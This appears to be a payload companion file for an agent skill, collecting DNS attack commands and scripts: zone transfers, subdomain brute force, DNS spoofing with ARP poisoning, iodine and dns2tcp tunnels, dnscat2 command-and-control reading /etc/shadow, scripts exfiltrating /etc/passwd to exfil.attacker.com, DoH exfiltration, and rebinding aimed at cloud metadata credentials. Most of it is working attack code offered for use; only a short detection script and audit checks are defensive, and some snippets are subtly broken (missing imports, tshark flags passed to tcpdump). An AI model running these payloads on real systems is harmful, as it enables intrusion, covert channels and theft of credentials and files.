# DNS Attacks Payloads -- Complete Attack Payload Collection

> This file is a companion to `SKILL.md`, containing all DNS attack payloads organized by category.

---

## 1. Zone Transfer Attempts (AXFR)

Attempt full zone transfers against all discovered nameservers. A single misconfigured nameserver reveals the entire DNS infrastructure.

```bash
# dnsrecon - zone transfer against all nameservers
dnsrecon -d target.com -t axfr

# dnsrecon - zone transfer against specific nameserver
dnsrecon -d target.com -t axfr -n ns1.target.com

# dig - zone transfer attempt
dig axfr target.com @ns1.target.com
dig axfr target.com @ns2.target.com

# host - zone transfer attempt
host -l target.com ns1.target.com
host -l target.com ns2.target.com

# dnsenum - zone transfer (included in full enumeration)
dnsenum --enum target.com

# Batch zone transfer against multiple domains
for domain in $(cat domains.txt); do
  echo "=== $domain ==="
  dig axfr $domain @$(dig +short NS $domain | head -1)
done
```

### Zone Transfer Result Parsing

```python
#!/usr/bin/env python3
"""Parse zone transfer results and extract high-value records."""
import re

def parse_axfr_output(axfr_text):
    """Parse dig axfr output into structured records."""
    records = []
    for line in axfr_text.splitlines():
        line = line.strip()
        if not line or line.startswith(';'):
            continue
        parts = line.split()
        if len(parts) >= 4:
            records.append({
                'name': parts[0].rstrip('.'),
                'ttl': parts[1],
                'type': parts[3],
                'value': ' '.join(parts[4:])
            })
    return records

# Example usage with saved output
with open('axfr_output.txt') as f:
    records = parse_axfr_output(f.read())

print(f"Total records: {len(records)}")
for r in records:
    if r['type'] in ('A', 'AAAA', 'MX', 'NS', 'TXT', 'SRV'):
        print(f"  {r['name']} [{r['type']}] -> {r['value']}")
```

---

## 2. DNS Record Enumeration

Enumerate specific DNS record types to map services, mail servers, and infrastructure.

```bash
# A record (IPv4 address)
dig target.com A +noall +answer
dig www.target.com A +short

# AAAA record (IPv6 address)
dig target.com AAAA +noall +answer

# MX record (mail exchange)
dig target.com MX +noall +answer

# NS record (nameservers)
dig target.com NS +noall +answer

# TXT record (text records - SPF, DKIM, domain verification)
dig target.com TXT +noall +answer

# SOA record (start of authority)
dig target.com SOA +noall +answer

# SRV record (service records)
dig _sip._tcp.target.com SRV +noall +answer
dig _ldap._tcp.target.com SRV +noall +answer
dig _xmpp-server._tcp.target.com SRV +noall +answer
dig _kerberos._tcp.target.com SRV +noall +answer
dig _ldap._tcp.dc._msdcs.target.com SRV +noall +answer

# CNAME record (canonical name / alias)
dig www.target.com CNAME +noall +answer

# PTR record (reverse DNS)
dig -x 192.168.1.1 +noall +answer

# ANY record (all available records)
dig target.com ANY +noall +answer

# DNSKEY record (DNSSEC public key)
dig target.com DNSKEY +noall +answer

# CAA record (certificate authority authorization)
dig target.com CAA +noall +answer

# Enumerate all common record types
for type in A AAAA MX NS TXT SOA SRV CNAME PTR CAA; do
  echo "=== $type ==="
  dig target.com $type +noall +answer
done
```

### Bulk Record Harvesting Script

```bash
#!/bin/bash
# Harvest all DNS records for a list of domains
# Usage: ./dns_harvest.sh domains.txt
while read domain; do
    echo "=== $domain ==="
    for type in A AAAA MX NS TXT SOA CNAME; do
        result=$(dig +short $domain $type 2>/dev/null)
        if [ -n "$result" ]; then
            echo "  [$type] $result"
        fi
    done
done < "$1"
```

---

## 3. Subdomain Enumeration

Discover subdomains through brute force, dictionary attacks, and search engine enumeration.

```bash
# dnsrecon - brute force subdomain enumeration
dnsrecon -d target.com -t brte -D /usr/share/wordlists/dnsrecon/namelist.txt

# dnsrecon - with custom wordlist
dnsrecon -d target.com -t brte -D /usr/share/wordlists/amass/subdomains-top1mil-5000.txt

# dnsrecon - reverse lookup enumeration
dnsrecon -t rvl -r 192.168.1.0/24

# dnsrecon - SRV record enumeration
dnsrecon -d target.com -t srv

# dnsenum - full enumeration with brute force
dnsenum --enum target.com
dnsenum --enum target.com -f /usr/share/dnsenum/dns.txt

# dnsenum - with custom wordlist and threads
dnsenum --enum target.com -f /usr/share/wordlists/dnsrecon/namelist.txt --threads 10

# fierce - subdomain brute force
fierce --domain target.com
fierce --domain target.com --subbrute
fierce --domain target.com --wordlist /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# dnswalk - zone walk for misconfigurations
dnswalk target.com.

# Manual brute force with dig
for sub in $(cat /usr/share/wordlists/dnsrecon/namelist.txt); do
  result=$(dig +short $sub.target.com A)
  if [ -n "$result" ]; then
    echo "$sub.target.com -> $result"
  fi
done

# Bing enumeration via dnsenum (passive discovery)
dnsenum target.com --dnsserver 8.8.8.8
```

### Amass Passive Subdomain Discovery

```bash
# Amass enum - passive subdomain enumeration (no DNS resolution)
amass enum -passive -d target.com -o amass_passive.txt

# Amass enum - active enumeration with DNS resolution
amass enum -active -d target.com -o amass_active.txt

# Amass enum - brute force with custom wordlist
amass enum -brute -d target.com -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt

# Amass enum - with DNS resolution and IP output
amass enum -active -d target.com -ip -o amass_with_ips.txt

# Combine results from multiple tools and deduplicate
cat amass_passive.txt dnsrecon_results.txt dnsenum_results.txt | sort -u > all_subdomains.txt
wc -l all_subdomains.txt
```

---

## 4. DNS Fingerprinting and Server Identification

Identify DNS server software, version, and configuration details.

```bash
# Query BIND version
dig @ns1.target.com version.bind chaos txt
dig @ns1.target.com version.bind chaos txt +short

# Query hostname
dig @ns1.target.com hostname.bind chaos txt

# Query server ID (for BIND)
dig @ns1.target.com id.server chaos txt

# Query authors (for BIND)
dig @ns1.target.com authors.bind chaos txt

# Test for open recursion (should REFUSE for external clients)
dig @ns1.target.com google.com
dig @ns1.target.com google.com +short

# Test for open recursion from external IP
# If this returns an IP address, recursion is enabled
dig @ns1.target.com www.example.com @ns1.target.com

# Check DNSSEC deployment
dig target.com A +dnssec +short
dig target.com DNSKEY +short
dig target.com DS +short

# Check EDNS support
dig @ns1.target.com target.com A +edns=0

# Fingerprint using fpdns (if available)
fpdns -s ns1.target.com

# Check if server supports TCP queries
dig +tcp target.com A @ns1.target.com

# Test for DNS amplify potential (open resolver)
dig @ns1.target.com target.com ANY
# Measure response size to calculate amplification factor
dig @ns1.target.com target.com ANY +dnssec | grep "MSG SIZE"
```

### DNS Server Benchmarking

```bash
# Compare response times between DNS servers
for server in 8.8.8.8 1.1.1.1 9.9.9.9 ns1.target.com; do
    echo -n "$server: "
    dig @$server target.com A +stats | grep "Query time"
done

# Test DNSSEC validation capability
dig @8.8.8.8 dnssec.works A +dnssec +short
dig @ns1.target.com dnssec.works A +dnssec +short
```

---

## 5. DNS Spoofing with dnschef

Spoof DNS responses to redirect victims to attacker-controlled servers.

```bash
# Basic DNS spoofing - redirect all queries to attacker IP
dnschef --fakeip 192.168.1.100 --interface 0.0.0.0

# Spoof specific domains only
dnschef --interface 0.0.0.0 --file spoof_hosts.ini

# Spoof with external nameserver for non-targeted queries
dnschef --fakeip 192.168.1.100 --interface 0.0.0.0 --nameserver 8.8.8.8

# Spoof only specific domain
dnschef --fakeip 192.168.1.100 --interface 0.0.0.0 --fakedomain target.com,mail.target.com

# Spoof with custom configuration file
cat > spoof_hosts.ini << 'EOF'
[A]
target.com = 192.168.1.100
www.target.com = 192.168.1.100
mail.target.com = 192.168.1.100
EOF
dnschef --interface 0.0.0.0 --file spoof_hosts.ini

# DNS spoofing with ARP poisoning for MITM
# Terminal 1: ARP spoofing
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

# Terminal 2: DNS spoofing
dnschef --fakeip 192.168.1.100 --interface 0.0.0.0

# Terminal 3 (optional): Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Spoofing with iptables redirect (transparent DNS proxy)
iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353
dnschef --interface 0.0.0.0 --port 5353 --fakeip 192.168.1.100
```

### Ettercap DNS Spoof Module

```bash
# Create ettercap DNS spoof file
cat > /usr/share/ettercap/etter.dns << 'EOF'
target.com        A   192.168.1.100
*.target.com      A   192.168.1.100
mail.target.com   A   192.168.1.100
EOF

# Run ettercap with DNS spoof plugin
ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//
```

---

## 6. DNS Tunneling with iodine

Establish IP-over-DNS tunnels to bypass network restrictions that allow DNS but block other protocols.

```bash
# Server side - start iodine server (needs authoritative DNS for tunnel domain)
# On attacker server with authoritative DNS configured:
iodined -f -P secretpassword 10.0.0.1/24 tunnel.attacker.com

# Server side with specific DNS port
iodined -f -P secretpassword 10.0.0.1/24 tunnel.attacker.com -p 5353

# Server side with maximum MTU
iodined -f -P secretpassword -m 1000 10.0.0.1/24 tunnel.attacker.com

# Client side - connect to iodine tunnel
iodine -f -P secretpassword dns.attacker.com tunnel.attacker.com

# Client side with specific DNS server
iodine -f -P secretpassword -s 8.8.8.8 tunnel.attacker.com

# Client side with maximum fragment size
iodine -f -P secretpassword -m 1000 dns.attacker.com tunnel.attacker.com

# After tunnel is established, verify connectivity
# Client should have tunnel interface (dns0 or similar) with IP 10.0.0.2
ping 10.0.0.1

# SSH through iodine tunnel
ssh -o ProxyCommand='iodine -P secretpassword dns.attacker.com tunnel.attacker.com' user@10.0.0.1

# Or SSH directly after tunnel is up
ssh user@10.0.0.1

# Set up routing through tunnel
ip route add 192.168.100.0/24 via 10.0.0.1 dev dns0
```

### Iodine Tunnel Performance Testing

```bash
# Test tunnel throughput
# On server: start iperf3
iperf3 -s -B 10.0.0.1

# On client: run iperf3 through tunnel
iperf3 -c 10.0.0.1 -t 30 -i 5

# Monitor tunnel interface
tcpdump -i dns0 -n -c 100

# Check tunnel DNS query rate
tcpdump -i eth0 -n port 53 -c 50 2>/dev/null | grep -c "A?"
```

---

## 7. DNS Tunneling with dns2tcp

Forward TCP connections over DNS queries for specific service access.

```bash
# Server side configuration
cat > dns2tcp.conf << 'EOF'
listen = 0.0.0.0
port = 53
user = nobody
chroot = /var/empty
domain = tunnel.attacker.com
resources = ssh:127.0.0.1:22,
            http:127.0.0.1:80,
            smtp:127.0.0.1:25
EOF

# Start dns2tcp server
dns2tcpd -f dns2tcp.conf
dns2tcpd -f dns2tcp.conf -d 2  # debug mode

# Client side - connect to SSH through DNS tunnel
dns2tcpc -z tunnel.attacker.com -r ssh -l 2222
# Then: ssh -p 2222 user@localhost

# Client side - connect to HTTP through DNS tunnel
dns2tcpc -z tunnel.attacker.com -r http -l 8080
# Then: curl http://localhost:8080

# Client side with specific DNS server
dns2tcpc -z tunnel.attacker.com -r ssh -l 2222 -s 8.8.8.8
```

### dns2tcp Multi-Resource Configuration

```bash
# Extended server config with more resources
cat > dns2tcp_extended.conf << 'EOF'
listen = 0.0.0.0
port = 53
user = nobody
chroot = /var/empty
domain = tunnel.attacker.com
resources = ssh:127.0.0.1:22,
            http:127.0.0.1:80,
            https:127.0.0.1:443,
            socks:127.0.0.1:1080,
            rdp:127.0.0.1:3389
EOF

# Start with extended configuration
dns2tcpd -f dns2tcp_extended.conf -d 3
```

---

## 8. DNS C2 with dnscat2

Establish encrypted command-and-control channels over DNS.

```bash
# Server side - start dnscat2
ruby dnscat2.rb tunnel.attacker.com

# Server side with shared secret
ruby dnscat2.rb --secret=MyS3cretK3y tunnel.attacker.com

# Server side with security settings
ruby dnscat2.rb --security=open tunnel.attacker.com

# Client side - Linux
ruby dnscat2.rb --secret MyS3cretK3y tunnel.attacker.com

# Client side - compiled binary
./dnscat tunnel.attacker.com

# After session established, server commands:
# List active sessions
sessions

# Interact with a session
session -i 1

# Tunnel through session (local port forwarding)
listen 127.0.0.1:8888 10.0.0.5:80

# Download file from client
download /etc/passwd

# Upload file to client
upload payload.sh /tmp/payload.sh

# Execute command on client
exec ifconfig
exec cat /etc/shadow

# Set delay between DNS queries (stealth)
delay 5000

# Set query type for stealth
set dns_type TXT
set dns_type CNAME
set dns_type MX
```

### dnscat2 Session Management

```bash
# Server: launch with domain and no encryption for testing
ruby dnscat2.rb --dns "domain=tunnel.attacker.com" --dns "host=0.0.0.0"

# List all active tunnels
tunnels

# Create a tunnel through an active session
tunnel create --session 1 --local 9999 --remote 3389

# Shutdown specific session
shutdown -s 1
```

---

## 9. DNS Exfiltration

Encode and exfiltrate data through DNS queries to attacker-controlled nameservers.

```bash
# Simple data exfiltration via DNS queries
# Encode data as hex subdomain labels
DATA="sensitive_data_here"
ENCODED=$(echo -n "$DATA" | xxd -p | fold -w 30 | head -1)
dig $ENCODED.exfil.attacker.com @attacker_dns

# File exfiltration - chunk and encode
FILE="/etc/passwd"
cat $FILE | xxd -p | fold -w 30 | while read chunk; do
  dig $chunk.exfil.attacker.com @attacker_dns_ip
  sleep 0.5
done

# File exfiltration with sequence numbers
SEQ=0
cat $FILE | xxd -p | fold -w 30 | while read chunk; do
  dig ${SEQ}.${chunk}.exfil.attacker.com @attacker_dns_ip
  SEQ=$((SEQ + 1))
  sleep 0.2
done

# Python DNS exfiltration script
python3 -c "
import dns.resolver
import os
import time

def exfiltrate_file(filepath, domain, dns_server):
    with open(filepath, 'rb') as f:
        data = f.read()
    hex_data = data.hex()
    chunks = [hex_data[i:i+30] for i in range(0, len(hex_data), 30)]
    for seq, chunk in enumerate(chunks):
        subdomain = f'{seq}.{chunk}.{domain}'
        try:
            dns.resolver.resolve(subdomain, 'A')
        except:
            pass
        time.sleep(0.1)
    print(f'Exfiltrated {len(chunks)} chunks')

exfiltrate_file('/etc/passwd', 'exfil.attacker.com', 'attacker_dns_ip')
"

# DNS exfiltration receiver (attacker nameserver)
# Use a custom DNS server that logs all queries
python3 -c "
from dnslib import DNSRecord, QTYPE
from dnslib.server import DNSServer, BaseResolver
import datetime

class ExfilResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        timestamp = datetime.datetime.now().isoformat()
        with open('exfiltrated.log', 'a') as f:
            f.write(f'{timestamp} {qname}\n')
        reply = request.reply()
        reply.add_answer(RR(qname, QTYPE.A, rdata=A('127.0.0.1')))
        return reply

resolver = ExfilResolver()
server = DNSServer(resolver, port=53, address='0.0.0.0')
server.start()
print('DNS exfiltration server running on port 53')
"

# Base32-encoded exfiltration (DNS-safe characters)
DATA="secret data 123"
ENCODED=$(echo -n "$DATA" | base32 | tr -d '=' | tr 'A-Z0-9' 'a-z0-9')
dig $ENCODED.b32.exfil.attacker.com @attacker_dns_ip
```

### DNS Exfiltration Detection Script

```python
#!/usr/bin/env python3
"""Detect DNS exfiltration by analyzing query patterns in PCAP files."""
import subprocess
import re
from collections import Counter

def detect_dns_exfil(pcap_path, threshold=30):
    """Flag domains with abnormally long subdomain labels."""
    result = subprocess.run(
        ['tshark', '-r', pcap_path, '-Y', 'dns.qry.name',
         '-T', 'fields', '-e', 'dns.qry.name'],
        capture_output=True, text=True
    )

    domain_lengths = Counter()
    for query in result.stdout.strip().split('\n'):
        if query:
            parts = query.split('.')
            for part in parts:
                if len(part) > threshold:
                    domain_lengths[query] += 1

    suspicious = {k: v for k, v in domain_lengths.items() if v > 0}
    print(f"Suspicious long-label queries: {len(suspicious)}")
    for domain, count in sorted(suspicious.items(), key=lambda x: -x[1]):
        print(f"  [{count}x] {domain}")

    return suspicious
```

---

## 10. Reverse DNS Enumeration

Map IP addresses to hostnames through reverse DNS lookups.

```bash
# Single reverse lookup
dig -x 192.168.1.1 +noall +answer
host 192.168.1.1
nslookup 192.168.1.1

# Reverse lookup range with dnsrecon
dnsrecon -t rvl -r 192.168.1.0/24

# Manual reverse lookup sweep
for i in $(seq 1 254); do
  result=$(dig +short -x 192.168.1.$i)
  if [ -n "$result" ]; then
    echo "192.168.1.$i -> $result"
  fi
done

# Reverse lookup common internal ranges
for subnet in "10.0.0" "10.0.1" "172.16.0" "172.16.1" "192.168.0" "192.168.1"; do
  for i in $(seq 1 254); do
    result=$(dig +short -x ${subnet}.$i)
    if [ -n "$result" ]; then
      echo "${subnet}.$i -> $result"
    fi
  done
done

# Fast parallel reverse lookup with parallel
seq 1 254 | parallel -j 50 "result=\$(dig +short -x 192.168.1.{}); \
  [ -n \"\$result\" ] && echo 192.168.1.{} -\> \$result"
```

### Reverse DNS for Cloud IP Ranges

```bash
# Reverse lookup AWS-like ranges for cloud asset discovery
for subnet in "10.0.0" "10.0.1" "10.0.2" "10.1.0" "10.1.1"; do
    for i in $(seq 1 254); do
        result=$(dig +short -x ${subnet}.${i} 2>/dev/null)
        if [ -n "$result" ]; then
            echo "${subnet}.${i} -> $result"
        fi
    done
done

# Reverse lookup using nmap for faster scanning
nmap -sn 192.168.1.0/24 --dns-servers 192.168.1.1 -oG reverse_scan.gnmap
grep "Status: Up" reverse_scan.gnmap
```

---

## 11. DNS Cache Snooping

Check what domains have been recently resolved by a DNS server's cache.

```bash
# Non-recursive query to check if a domain is cached
dig @ns1.target.com +noall +answer +norecurse www.facebook.com A
dig @ns1.target.com +noall +answer +norecurse www.google.com A

# Batch cache snooping
for domain in facebook.com google.com youtube.com twitter.com github.com; do
  result=$(dig @ns1.target.com +norecurse +short $domain A)
  if [ -n "$result" ]; then
    echo "[CACHED] $domain -> $result"
  else
    echo "[NOT CACHED] $domain"
  fi
done

# Cache snooping for specific target domains (infrastructure discovery)
for domain in vpn.target.com mail.target.com owa.target.com intranet.target.com; do
  result=$(dig @ns1.target.com +norecurse +short $domain A)
  if [ -n "$result" ]; then
    echo "[CACHED] $domain -> $result"
  fi
done
```

---

## 12. DNS Amplification and Reflection

Test for DNS amplification vulnerability on target nameservers.

```bash
# Measure query and response sizes
dig @ns1.target.com target.com ANY +dnssec +ignore

# Check amplification factor
dig @ns1.target.com isc.org ANY +dnssec +stats | grep "MSG SIZE"

# Test with specific query types for largest responses
dig @ns1.target.com target.com ANY +dnssec | wc -c
dig @ns1.target.com target.com TXT +dnssec | wc -c
dig @ns1.target.com target.com DNSKEY +dnssec | wc -c

# Verify open recursion (amplification requires open resolver)
dig @ns1.target.com google.com +short
# If IP returned, server is open resolver and can be used for amplification
```

### Amplification Factor Calculator

```bash
#!/bin/bash
# Calculate DNS amplification factor for a resolver
RESOLVER=$1
DOMAIN=${2:-"isc.org"}

if [ -z "$RESOLVER" ]; then
    echo "Usage: $0 <resolver_ip> [domain]"
    exit 1
fi

# Measure query size
QUERY_SIZE=$(echo -n "$DOMAIN" | wc -c)
QUERY_SIZE=$((QUERY_SIZE + 20))  # DNS header overhead

# Measure response size
RESPONSE_SIZE=$(dig @$RESOLVER $DOMAIN ANY +dnssec +ignore 2>/dev/null | wc -c)

if [ "$RESPONSE_SIZE" -gt 0 ]; then
    FACTOR=$(echo "scale=1; $RESPONSE_SIZE / $QUERY_SIZE" | bc)
    echo "Query size: ~${QUERY_SIZE} bytes"
    echo "Response size: ${RESPONSE_SIZE} bytes"
    echo "Amplification factor: ${FACTOR}x"
else
    echo "No response received (server may block ANY queries)"
fi
```

---

## 13. DNS Rebinding Attacks

Configure DNS to alternate between attacker IP and target IP to bypass same-origin policy.

```bash
# DNS rebinding with short TTL
# Configure attacker nameserver with:
# - First query returns attacker IP (1.2.3.4)
# - Second query returns target IP (127.0.0.1 or 169.254.169.254)
# - TTL set to 0 or 1 second

# Using rbndr.us public rebinding service
# Format: <hex-ip1>.<hex-ip2>.rbndr.us
# 127.0.0.1 = 7f000001, 169.254.169.254 = a9fea9fe
curl "http://7f000001.a9fea9fe.rbndr.us/"

# Custom DNS rebinding nameserver using Python
python3 -c "
from dnslib import DNSRecord, QTYPE, RR, A
from dnslib.server import DNSServer, BaseResolver
import itertools

class RebindResolver(BaseResolver):
    def __init__(self):
        self.counter = itertools.cycle([0, 1])
        self.ips = ['1.2.3.4', '127.0.0.1']

    def resolve(self, request, handler):
        qname = str(request.q.qname)
        idx = next(self.counter)
        ip = self.ips[idx]
        reply = request.reply()
        reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip), ttl=0))
        return reply

resolver = RebindResolver()
server = DNSServer(resolver, port=53, address='0.0.0.0')
server.start()
print('DNS rebinding server running - alternating between 1.2.3.4 and 127.0.0.1')
"
```

### DNS Rebinding SSRF Test Harness

```bash
# Test DNS rebinding against SSRF-protected endpoints
# Step 1: Start rebinding server (above)
# Step 2: Configure your domain's NS record to point to attacker server
# Step 3: Test target SSRF endpoint

# Test AWS metadata endpoint access via rebinding
curl -v "http://rebind.attacker.com/latest/meta-data/iam/security-credentials/"

# Test with timing to hit second resolution
for i in $(seq 1 10); do
    echo "Attempt $i:"
    curl -s -o /dev/null -w "%{http_code}" "http://rebind.attacker.com:8080/admin"
    echo
    sleep 1
done
```

---

## 14. dnswalk - DNS Zone Auditing

Audit DNS zones for misconfigurations and security issues.

```bash
# Basic zone walk
dnswalk target.com.

# Walk with detailed output
dnswalk -d target.com.

# Walk specific subdomain zone
dnswalk sub.target.com.

# Interactive mode
dnswalk -i target.com.

# Output interpretation:
# GOOD  = correct delegation
# BAD   = delegation problem
# WARN  = potential issue
# FAIL  = serious error
```

### DNS Zone Security Audit

```bash
# Automated zone security audit combining multiple checks
#!/bin/bash
DOMAIN=${1:-"target.com"}
echo "=== DNS Security Audit: $DOMAIN ==="

echo "[1] Checking zone transfer..."
dig axfr $DOMAIN @$(dig +short NS $DOMAIN | head -1) 2>/dev/null | grep -c "XFR" && echo "VULN: Zone transfer open" || echo "OK: Zone transfer blocked"

echo "[2] Checking DNSSEC..."
dig $DOMAIN DNSKEY +short 2>/dev/null | head -1 && echo "OK: DNSSEC configured" || echo "WARN: No DNSSEC"

echo "[3] Checking CAA records..."
dig $DOMAIN CAA +short 2>/dev/null | head -1 || echo "WARN: No CAA records"

echo "[4] Checking SPF..."
dig $DOMAIN TXT +short | grep "v=spf1" || echo "WARN: No SPF record"

echo "[5] Checking DMARC..."
dig _dmarc.$DOMAIN TXT +short | grep "v=DMARC1" || echo "WARN: No DMARC record"

echo "[6] Checking DKIM..."
dig default._domainkey.$DOMAIN TXT +short | head -1 || echo "WARN: No DKIM record found"
```

---

## 15. Custom DNS Query Scripts

Python scripts for automated DNS testing and data extraction.

```python
"""
Automated DNS enumeration script using dnspython.
Discovers subdomains through multiple techniques and validates results.
"""
import dns.resolver
import dns.query
import dns.zone
import dns.reversename
import socket

def enumerate_zone_transfer(domain, nameserver):
    """Attempt zone transfer against a nameserver."""
    try:
        zone = dns.zone.from_xfr(dns.query.xfr(nameserver, domain))
        records = []
        for name, node in zone.nodes.items():
            for rdataset in node.rdatasets:
                records.append(f"{name}.{domain} {rdataset}")
        return records
    except Exception as e:
        return [f"Zone transfer failed: {e}"]

def enumerate_records(domain, record_type):
    """Query specific record type for a domain."""
    try:
        answers = dns.resolver.resolve(domain, record_type)
        return [str(rdata) for rdata in answers]
    except Exception:
        return []

def brute_force_subdomains(domain, wordlist_path):
    """Brute force subdomains using a wordlist."""
    found = []
    with open(wordlist_path) as f:
        words = [line.strip() for line in f if line.strip()]
    for word in words:
        subdomain = f"{word}.{domain}"
        try:
            ips = dns.resolver.resolve(subdomain, 'A')
            for ip in ips:
                found.append(f"{subdomain} -> {ip}")
                print(f"[FOUND] {subdomain} -> {ip}")
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
            pass
        except Exception:
            pass
    return found

def reverse_lookup(ip_range_start, ip_range_end):
    """Perform reverse DNS lookups on an IP range."""
    results = []
    start = list(map(int, ip_range_start.split('.')))
    end = list(map(int, ip_range_end.split('.')))
    for i in range(start[3], end[3] + 1):
        ip = f"{start[0]}.{start[1]}.{start[2]}.{i}"
        try:
            rev = dns.reversename.from_address(ip)
            hostname = str(dns.resolver.resolve(rev, 'PTR')[0])
            results.append(f"{ip} -> {hostname}")
        except Exception:
            pass
    return results
```

---

## 16. DNS-over-HTTPS (DoH) Tunneling

Use DoH to bypass traditional DNS monitoring and exfiltrate data through encrypted DNS channels.

```bash
# Perform DNS queries over HTTPS to evade DNS monitoring
curl -s -H "Accept: application/dns-json" "https://dns.google/resolve?name=target.com&type=A"

# Using doggo for DoH queries
doggo target.com @https://dns.google

# DoH-based data exfiltration (encode data as subdomain labels)
DATA="secret_data_here"
ENCODED=$(echo -n "$DATA" | base32 | tr -d '=' | tr 'A-Z0-9' 'a-z0-9')
curl -s -H "Accept: application/dns-json" "https://dns.google/resolve?name=${ENCODED}.exfil.attacker.com&type=A"
```

### DoH Provider Fingerprinting

```bash
# Test multiple DoH providers for data exfiltration capability
for provider in "https://dns.google/resolve" "https://cloudflare-dns.com/dns-query" "https://dns.quad9.net/dns-query"; do
    echo "Testing: $provider"
    curl -s -H "Accept: application/dns-json" "${provider}?name=target.com&type=A" | python3 -m json.tool 2>/dev/null | head -10
    echo
done
```

## 17. DNSSEC Subdomain Walking

Walk DNSSEC-enabled zones using NSEC records to discover all subdomains even when zone transfers are blocked.

```bash
# Enumerate subdomains via NSEC walking
dig target.com NSEC +dnssec +noall +answer

# Walk the zone by following NSEC chain
CURRENT="target.com"
for i in $(seq 1 50); do
  NEXT=$(dig $CURRENT NSEC +short +dnssec 2>/dev/null | awk '{print $1}')
  if [ -z "$NEXT" ] || [ "$NEXT" = "$CURRENT" ]; then
    break
  fi
  echo "Found: $NEXT"
  CURRENT="$NEXT"
done

# Use ldns-walk for automated NSEC walking
ldns-walk target.com

# Use dnsrecon for NSEC walking
dnsrecon -d target.com -t snoop --ns ns1.target.com
```

### NSEC3 Zone Walking

```bash
# NSEC3 requires hash cracking - use nsec3walker if available
# First collect NSEC3 parameters
dig target.com NSEC3PARAM +short

# Use dnsrecon for NSEC3 enumeration
dnsrecon -d target.com -t brte -D /usr/share/wordlists/dnsrecon/namelist.txt

# Manual NSEC3 hash cracking approach
python3 -c "
import hashlib
import dns.resolver

domain = 'target.com'
salt = ''  # Extract from NSEC3PARAM record
iterations = 1

with open('/usr/share/wordlists/dnsrecon/namelist.txt') as f:
    for word in f:
        word = word.strip()
        name = word + '.' + domain
        # NSEC3 hash: SHA1(salt + name)
        data = hashlib.sha1((name + salt).encode()).hexdigest()
        print(f'{word}: {data}')
" 2>/dev/null | head -20
```

## 18. DNS-Based Service Discovery

Discover internal services through DNS SRV records and service enumeration patterns.

```bash
# Common SRV record patterns for enterprise services
dig _kerberos._tcp.target.com SRV +short
dig _ldap._tcp.target.com SRV +short
dig _ldaps._tcp.target.com SRV +short
dig _sip._tcp.target.com SRV +short
dig _xmpp-server._tcp.target.com SRV +short
dig _imap._tcp.target.com SRV +short
dig _caldav._tcp.target.com SRV +short
dig _mongodb._tcp.target.com SRV +short
dig _mysql._tcp.target.com SRV +short
dig _postgres._tcp.target.com SRV +short

# Enumerate AD domain controllers via SRV
dig _ldap._tcp.dc._msdcs.target.com SRV +short
dig _kerberos._tcp.dc._msdcs.target.com SRV +short

# Batch SRV enumeration from a wordlist
for svc in kerberos ldap ldaps gc sip xmpp imap smtp caldav ftp ssh; do
  result=$(dig _${svc}._tcp.target.com SRV +short)
  if [ -n "$result" ]; then
    echo "[FOUND] ${svc}: $result"
  fi
done
```

### Active Directory DNS Discovery

```bash
# Complete AD DNS service enumeration
DOMAIN="target.com"

echo "=== Domain Controllers ==="
dig _ldap._tcp.dc._msdcs.$DOMAIN SRV +short
dig _kerberos._tcp.dc._msdcs.$DOMAIN SRV +short

echo "=== Global Catalog ==="
dig _gc._tcp.$DOMAIN SRV +short
dig _ldap._tcp.gc._msdcs.$DOMAIN SRV +short

echo "=== Kerberos KDC ==="
dig _kerberos._tcp.$DOMAIN SRV +short
dig _kpasswd._tcp.$DOMAIN SRV +short

echo "=== Site-specific ==="
dig _ldap._tcp.default-first-site-name._sites.$DOMAIN SRV +short

echo "=== Forest DNS Zones ==="
dig _ldap._tcp.forestdnszones.$DOMAIN SRV +short
dig _ldap._tcp.domaindnszones.$DOMAIN SRV +short
```

## 19. DNS Poisoning Resistance Testing

Test whether DNS resolvers validate responses properly against cache poisoning attacks.

```bash
# Test for predictable transaction IDs (weak resolver)
# Send multiple queries and check for sequential TXIDs
for i in $(seq 1 10); do
  dig @ns1.target.com target.com A +short +dnssec 2>/dev/null | head -1
  sleep 0.1
done

# Test for source port randomization
# A resolver using fixed source ports is vulnerable to Kaminsky attack
tcpdump -i eth0 -n port 53 -c 20 -w dns_port_test.pcap
# Analyze: tshark -r dns_port_test.pcap -Y "dns.qr==0" -T fields -e udp.srcport | sort -u | wc -l
# Low unique count = poor randomization = vulnerable

# Test for 0x20 encoding (case randomization) support
dig @ns1.target.com TaRgEt.CoM A +noall +question
# If response preserves mixed case, resolver supports 0x0 encoding
```

### DNS Cache Poisoning Simulation

```bash
#!/bin/bash
# Test DNS resolver's resistance to cache poisoning
RESOLVER=${1:-"8.8.8.8"}
TARGET_DOMAIN=${2:-"test.target.com"}

echo "=== DNS Cache Poisoning Resistance Test ==="
echo "Resolver: $RESOLVER"
echo "Target domain: $TARGET_DOMAIN"

# Test 1: Check for randomized source ports
echo "[1] Source port randomization test"
for i in $(seq 1 20); do
    dig @$RESOLVER $TARGET_DOMAIN A +retry=0 +time=1 2>/dev/null &
done
wait
tcpdump -r dns_port_test.pcap -Y "dns.qr==0" -T fields -e udp.srcport 2>/dev/null | sort -u | wc -l
echo "  (Should be 20+ unique ports)"

# Test 2: Check TTL compliance
echo "[2] TTL compliance test"
dig @$RESOLVER $TARGET_DOMAIN A +noall +answer +dnssec 2>/dev/null

# Test 3: DNSSEC validation
echo "[3] DNSSEC validation test"
dig @$RESOLVER dnssec-failed.org A +dnssec +short 2>/dev/null
echo "  (SERVFAIL = DNSSEC validation working)"
```
